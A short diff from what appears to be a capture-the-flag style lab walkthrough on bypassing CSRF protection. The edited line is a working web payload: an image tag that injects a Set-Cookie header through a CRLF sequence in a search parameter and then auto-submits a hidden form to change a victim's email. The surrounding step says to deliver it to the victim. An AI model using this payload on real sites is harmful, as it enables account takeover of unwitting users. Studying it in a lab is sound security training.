@@ -28,7 +28,7 @@ Imagine a shopping application that allows its users to change their email addre
 	<input type="hidden" name="csrf" value="fh6RhHzKaIRlyk2fzZJW1Xxxj6KVpDZp" />
 </form>
 
-<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=uM3IBWr9qbdJgnV9DBqjXEOcdHG3rMPp%3b%20SameSite=None" onerror="document.forms[0].submit()">
+<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrf=uM3IBWr9qbdJgnV9DBqjXEOcdHG3rMPp%3b%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 8. Store the exploit then click "Deliver to victim" to solve the lab.
 ## Note
